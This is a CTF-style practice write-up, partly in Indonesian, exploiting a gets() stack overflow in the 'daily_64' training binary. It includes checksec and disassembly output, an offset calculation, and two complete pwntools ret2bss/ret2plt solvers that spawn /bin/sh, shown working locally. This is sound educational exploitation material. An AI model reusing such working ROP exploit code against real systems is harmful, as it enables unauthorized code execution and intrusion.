---
slug: "pwn-daily-64"
title: "daily_64"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2bss / ret2plt."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X64","RET2BSS"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-daily-64"
---

# daily_64

> Latihan buat persiapan seleksi LKS, isinya ret2bss / ret2plt.

Di sini kita tidak diberi hint apa apa, jadi kita harus ngerecon.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ checksec daily_64                                                              󰥔 14:54:28
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily/daily_64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ pwndbg daily_64                                                                                                                                                                󰥔 14:55:31
info fuGEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from daily_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in daily_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  puts@plt
0x0000000000401090  system@plt
0x00000000004010a0  printf@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  setvbuf@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  init
0x00000000004011fd  time
0x0000000000401214  daily
0x0000000000401275  main
0x00000000004012a0  __libc_csu_init
0x0000000000401310  __libc_csu_fini
0x0000000000401318  _fini
```

There’s so many symbols and function in this one, lets check the function.

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401275 <+0>:     endbr64
   0x0000000000401279 <+4>:     push   rbp
   0x000000000040127a <+5>:     mov    rbp,rsp
   0x000000000040127d <+8>:     mov    eax,0x0
   0x0000000000401282 <+13>:    call   0x4011b6 <init>
   0x0000000000401287 <+18>:    mov    eax,0x0
   0x000000000040128c <+23>:    call   0x401214 <daily>
   0x0000000000401291 <+28>:    mov    eax,0x0
   0x0000000000401296 <+33>:    pop    rbp
   0x0000000000401297 <+34>:    ret
End of assembler dump.
gef➤  disas daily
Dump of assembler code for function daily:
   0x0000000000401214 <+0>:     endbr64
   0x0000000000401218 <+4>:     push   rbp
   0x0000000000401219 <+5>:     mov    rbp,rsp
   0x000000000040121c <+8>:     sub    rsp,0x30
   0x0000000000401220 <+12>:    lea    rdi,[rip+0xde9]        # 0x402010
   0x0000000000401227 <+19>:    call   0x401080 <puts@plt>
   0x000000000040122c <+24>:    lea    rdi,[rip+0xdfd]        # 0x402030
   0x0000000000401233 <+31>:    call   0x401080 <puts@plt>
   0x0000000000401238 <+36>:    lea    rdi,[rip+0xe09]        # 0x402048
   0x000000000040123f <+43>:    call   0x401080 <puts@plt>
   0x0000000000401244 <+48>:    lea    rdi,[rip+0xe4d]        # 0x402098
   0x000000000040124b <+55>:    mov    eax,0x0
   0x0000000000401250 <+60>:    call   0x4010a0 <printf@plt>
   0x0000000000401255 <+65>:    lea    rax,[rbp-0x30]
   0x0000000000401259 <+69>:    mov    rdi,rax
   0x000000000040125c <+72>:    mov    eax,0x0
   0x0000000000401261 <+77>:    call   0x4010b0 <gets@plt>
   0x0000000000401266 <+82>:    lea    rdi,[rip+0xe83]        # 0x4020f0
   0x000000000040126d <+89>:    call   0x401080 <puts@plt>
   0x0000000000401272 <+94>:    nop
   0x0000000000401273 <+95>:    leave
   0x0000000000401274 <+96>:    ret
End of assembler dump.
gef➤  disas time
Dump of assembler code for function time:
   0x00000000004011fd <+0>:     endbr64
   0x0000000000401201 <+4>:     push   rbp
   0x0000000000401202 <+5>:     mov    rbp,rsp
   0x0000000000401205 <+8>:     lea    rdi,[rip+0xdfc]        # 0x402008
   0x000000000040120c <+15>:    call   0x401090 <system@plt>
   0x0000000000401211 <+20>:    nop
   0x0000000000401212 <+21>:    pop    rbp
   0x0000000000401213 <+22>:    ret
End of assembler dump.
```

Okay then, the disas time give us confirmation that system@plt is exist. Now we count the padding for the gets. 0x30 = 48, because its x86, we need 56 for reaching RIP. And now we verification for the offset for the RIP.

```
>>> 0x30
48
>>> 0x30 + 8
56
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1f
$rbx   : 0x0
$rcx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rdx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rsp   : 0x00007fffffffdfa8  →  "haaaaaaaiaaaaa"
$rbp   : 0x6161616161616167 ("gaaaaaaa"?)
$rsi   : 0x00007ffff7e4e603  →  0xe4f750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x0000000000401274  →  <daily+0060> ret
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffe0d0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe3c0  →  0x0000000000000000
$r15   : 0x00007fffffffe0e8  →  0x00007fffffffe50d  →  "PWD=/home/claritys/ctf/pwncheatsheet/learnfromLKS/[...]"
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfa8│+0x0000: "haaaaaaaiaaaaa"     ← $rsp
0x00007fffffffdfb0│+0x0008: 0x0000616161616169 ("iaaaaa"?)
0x00007fffffffdfb8│+0x0010: 0x00007ffff7c27d0e  →   mov edi, eax
0x00007fffffffdfc0│+0x0018: 0x0000000000000025 ("%"?)
0x00007fffffffdfc8│+0x0020: 0x0000000000401275  →  <main+0000> endbr64
0x00007fffffffdfd0│+0x0028: 0x00000001f7fe1bf0
0x00007fffffffdfd8│+0x0030: 0x00007fffffffe0d8  →  0x00007fffffffe4a8  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0x00007fffffffdfe0│+0x0038: 0x0000000000400040  →   (bad)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40126d <daily+0059>     call   0x401080 <puts@plt>
     0x401272 <daily+005e>     nop
     0x401273 <daily+005f>     leave
 →   0x401274 <daily+0060>     ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "daily_64", stopped 0x401274 in daily (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401274 → daily()
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

Nah, ini kurang lebih itu hampir sama dengan yang daily\_32 tadi. Bedanya, ini 64 bit. Yang di mana:

**Perbedaan yang dapat dirasa itu adalah jika ngerakit payload itu harus dengan format yang di mana:**

`pop rdi   args1   function`

**biar nanti functionnya itu memasukkan args1 kedalam function.**

**Perbedaan yang dapat dirasa itu adalah jika ngerakit payload itu harus dengan format yang di mana:**

`pop rdi   args1   function`

**biar nanti functionnya itu memasukkan args1 kedalam function.**

My solver with intended solve:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("daily_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = 'amd64'

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    padding = 56
    rdi = 0x0000000000401303
    # GESER ALAMAT BSS AGAR TIDAK MENIMPA DATA INTERNAL LIBC
    bss = elf.bss() + 0x200
    gets = elf.sym['gets']
    system = elf.sym['system']
    payload = flat(
        b'A' * padding,
        #dia nanti jadi gets(bss), jadinya kita harus mengisi bss dengan hal nanti yang akan dieksekusi system(bss)
        rdi, 
        bss, #masukkin bss ke rdi
        gets,
        
        rdi, #masukkin bss ke rdi
        bss, #masukkin system jadi system(bss), jadi system akan ngeexecute value bss yang barusan diinput setelah send payload
        system
    )
    # good luck pwning :)
    r.sendline(payload)
    r.sendline(b'/bin/sh\x00')
    r.interactive()

if __name__ == "__main__":
    main()
```

Implement:

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ python3 solve.py LOCAL                                                         󰥔 15:01:21
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily/daily_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[┤] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/daily/daily_64_patched': pid 107278
[*] Switching to interactive mode
--- [ Lylera's Diary Book ] ---
Lylera: Halooo!
Lylera: Aku punya banyak kesibukan. Tapi untuk hari ini aku mau nulis sesuatu.
Lylera: Simple aja sih... Mungkin bisa something yang aku inginkan. Oh aku ada ide!
> Lylera: puurrrfeectt!! Thx yow
$ ls
daily_32          daily_64_patched  solve32_intended_ret2bss.py
daily_32_patched  daily.c           solve32_unintended_libc.py
daily_64          daily.zip         solve.py
```

Solver resmi dari latihan LKS nya adalah:

```python
# Baru bisa main auto pwntools yowww

from pwn import *

elf = context.binary = ELF('./daily_64')
p = process()

# lets see butuhnya apa aja :v

ret = p64(0x40101a)
rdi = p64(0x401303)
bss = elf.bss() + 0x100
gets = elf.plt['gets']
system = elf.plt['system']

offset = 56

payload = flat(
    'A' * offset,
    ret,
    rdi, bss,
    gets, ret,
    rdi, bss,
    system
)

p.sendlineafter(b'> ', payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```
